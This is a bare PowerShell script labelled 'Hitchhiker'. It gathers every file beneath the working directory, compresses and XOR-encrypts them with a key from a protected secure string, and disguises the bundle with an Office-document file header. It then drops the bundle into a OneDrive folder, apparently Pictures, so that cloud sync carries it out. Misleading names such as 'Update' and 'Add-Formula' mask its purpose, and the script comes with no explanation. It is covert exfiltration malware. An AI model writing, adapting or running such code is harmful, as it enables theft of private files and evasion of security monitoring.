#Hitchhiker
$Wack = @'
    Add-Type -AssemblyName System.Web.Extensions
    #Update
    $t = ConvertTo-SecureString -String "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000ba42e96fe921ba499035ca2e4b0cb23300000000020000000000106600000001000020000000f11952ce87776c486d635b85374d23d512309fc8bba2787f4e1ef81855000659000000000e8000000002000020000000922dda051e4c5355c1ac8a7de52df7252f93bbcea6098faa7b190c4f763ba1df20000000dca20f556d1c0285f342c4527512e8176a783bb190a8e32463867a18e2763333400000001584920d6076e161a78b2cf58ea7995157b591ed4d177bcb6dcfb64f8f422fbc713fd73f78855ae4f9600dc58e5232efc6228f5690a204827e0c0b345aa5c483";$t = (New-Object System.Management.Automation.PSCredential('x',$t)).GetNetworkCredential().Password
    $xk = [System.Text.Encoding]::UTF8.GetBytes($t)
    function Add-Formula {
        param($d, $k)
        $o = [byte[]]::new($d.Length)
        for ($i = 0; $i -lt $d.Length; $i++) {
            $o[$i] = $d[$i] -bxor $k[$i % $k.Length]
        }
        return $o
    }
    $fs = gci -Recurse -File
    $fme = [System.Collections.Generic.Dictionary[string, string]]::new()
    foreach ($f in $fs) {
        $r = $f.FullName.Substring($pwd.path.Length).TrimStart('\')
        $nb = [System.Text.Encoding]::UTF8.GetBytes($r)
        $xnb = Add-Formula $nb $xk
        $en = [Convert]::ToBase64String($xnb)
        $rb = [System.IO.File]::ReadAllBytes($f.FullName)
        $cs = New-Object System.IO.MemoryStream
        $gzs = New-Object System.IO.Compression.GzipStream($cs, [IO.Compression.CompressionMode]::Compress)
        $gzs.Write($rb, 0, $rb.Length)
        $gzs.Close()
        $cb = $cs.ToArray()
        $cs.Dispose()
        $xc = Add-Formula $cb $xk
        $fme[$en] = [Convert]::ToBase64String($xc)
    }
    $js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $maxLength = 50MB
    $maxJsonLengthProp = $js.GetType().GetProperty('MaxJsonLength')
    if ($maxJsonLengthProp) {
        $maxJsonLengthProp.SetValue($js, $maxLength, $null)
    } else {
        $field = $js.GetType().GetField('_maxJsonLength', [System.Reflection.BindingFlags] "Instance,NonPublic")
        if ($field) { $field.SetValue($js, $maxLength) }
    }    
    $j = $js.Serialize($fme)
    #$j = [System.Text.Json.JsonSerializer]::Serialize($fme, [System.Collections.Generic.Dictionary[string, string]], [System.Text.Json.JsonSerializerOptions]::new())
    $jb = [System.Text.Encoding]::UTF8.GetBytes($j)
    $xjb = Add-Formula $jb $xk
    $oh = [byte[]](0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1)
    $fp = $oh + $xjb
    if ($Env:OneDriveCommercial) {$eo = $Env:OneDriveCommercial} else {$eo = $Env:OneDriveConsumer}
    $d = ($eo + "\" + (ls $eo | ?{$_.Name -like "P*c*u*" -and $_.Attributes -like 'Dir*'}).Name) + "xyz"
    [System.IO.File]::WriteAllBytes($d, $fp)
    Write-Host '..' 
'@
powershell.exe -version 3 -Command "$wack"
